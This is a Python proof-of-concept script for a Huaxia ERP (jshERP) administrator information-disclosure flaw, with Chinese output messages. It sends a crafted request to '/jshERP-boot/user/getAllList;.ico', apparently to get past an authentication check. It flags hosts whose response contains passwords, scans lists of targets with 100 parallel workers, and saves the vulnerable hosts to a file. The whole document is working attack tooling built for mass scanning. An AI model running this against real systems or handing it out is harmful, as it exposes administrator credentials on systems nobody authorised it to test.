import sys,argparse,requests,re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    test = """华夏ERP管理员信息泄露漏洞"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="华夏ERP管理员信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(targer):
    payload = "/jshERP-boot/user/getAllList;.ico"
    herders = {
        "User - Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47Safari/537.36",
        "Connection" : "close",
        "Accept" : "*/*",
        "Accept-Language" : "en",
        "Accept-Encoding" : "gzip",
    }
    res = requests.get(targer)
    try:
        if res.status_code == 200:
            res1 = requests.get(url=targer+payload, headers=herders,verify=False, timeout=5)
            if res1.status_code == 200 and "password" in res1.text:
                print(f"[+]该{targer}存在信息泄露漏洞")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(f"[+]{targer} 存在信息泄露漏洞\n")
            else:
                print(f"该{targer}不存在信息泄露漏洞")
        else:
            print(f"该{targer}存在问题，请手工检测")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()